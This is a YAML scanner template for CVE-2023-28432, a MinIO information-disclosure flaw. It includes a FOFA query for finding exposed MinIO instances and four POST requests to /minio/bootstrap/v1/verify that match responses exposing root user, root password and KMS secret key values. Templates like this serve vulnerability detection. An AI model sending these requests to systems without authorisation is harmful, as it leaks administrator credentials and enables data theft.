id: CVE-2023-28432

info:
  name: MinIO 未授权信息泄露
  author: zan8in
  severity: high
  verified: true
  expression: |
    Minio is a Multi-Cloud Object Storage framework. In a cluster deployment starting with RELEASE.2019-12-17T23-16-33Z and prior to RELEASE.2023-03-20T20-16-18Z, MinIO returns all environment variables, including `MINIO_SECRET_KEY` and `MINIO_ROOT_PASSWORD`, resulting in information disclosure. All users of distributed deployment are impacted. All users are advised to upgrade to RELEASE.2023-03-20T20-16-18Z.
    fofa: app="minio" && port=9000

set:
  hostname: request.url.host
rules:
  r0:
    request:
      raw: |
        POST /minio/bootstrap/v1/verify HTTP/1.1
        Host: {{hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
    expression: response.status == 200 && response.body.bcontains(b'"MINIO_KMS_SECRET_KEY":') && response.body.bcontains(b'"MINIO_ROOT_PASSWORD":') && response.body.bcontains(b'"MINIO_ROOT_USER":')
  r1:
    request:
      raw: |
        POST /minio/bootstrap/v1/verify HTTP/1.1
        Host: {{hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
    expression: response.status == 200 && response.body.bcontains(b'"MINIO_KMS_SECRET_KEY":') && response.body.bcontains(b'"MINIO_ROOT_PASSWORD":') && response.body.bcontains(b'"MINIO_ROOT_USER":')
  r2:
    request:
      method: POST
      path: /minio/bootstrap/v1/verify
      headers:
        Content-Type: application/x-www-form-urlencoded
    expression: response.status == 200 && response.body.bcontains(b'"MINIO_KMS_SECRET_KEY":') && response.body.bcontains(b'"MINIO_ROOT_PASSWORD":') && response.body.bcontains(b'"MINIO_ROOT_USER":')
  r3:
    request:
      method: POST
      path: /minio/bootstrap/v1/verify
      headers:
        Content-Type: application/json
    expression: response.status == 200 && response.body.bcontains(b'"MINIO_KMS_SECRET_KEY":') && response.body.bcontains(b'"MINIO_ROOT_PASSWORD":') && response.body.bcontains(b'"MINIO_ROOT_USER":')
expression: r0() || r1() || r2() || r3()
